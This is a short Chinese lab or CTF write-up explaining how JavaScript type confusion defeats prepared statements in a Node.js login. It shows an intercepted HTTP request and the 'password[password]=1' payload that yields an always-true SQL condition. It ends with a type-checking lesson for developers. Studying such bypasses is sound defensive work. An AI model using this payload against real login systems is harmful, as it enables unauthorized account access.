## 考点

通过`JavaScript`的类型绕过预查询语句的防护。

## 工具

`BurpSuite`

## 步骤

1. 拦截正常登陆的包：

   ```yaml
   POST /auth HTTP/1.1
   Host: 192.168.0.102:3000
   Content-Length: 35
   Cache-Control: max-age=0
   Upgrade-Insecure-Requests: 1
   Origin: http://192.168.0.102:3000
   Content-Type: application/x-www-form-urlencoded
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
   Referer: http://192.168.0.102:3000/
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.9
   Cookie: connect.sid=s%3A69M4yxkcHdAsLwQx9JullM_JDzlalDFg.mVOeagjY0jMf6Q5e1%2BG6Bb2v6ORdpmcbCJlrTgdFFZ4
   Connection: close
   
   username=admin&password=1
   ```

2. 修改`body`为`username=admin&password[password]=1`，此时在后端的查询为：

   ```sql
   > SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1;
   该查询语句等价于下面这句：
   > SELECT * FROM accounts WHERE username = 'admin' AND 1 = 1;
   也就是：
   > SELECT * FROM accounts WHERE username = 'admin';
   ```


## 总结

使用了预查询语句也并非高枕无忧，使用JavaScript这种弱类型的语言，要记得在必要的地方进行类型检查。
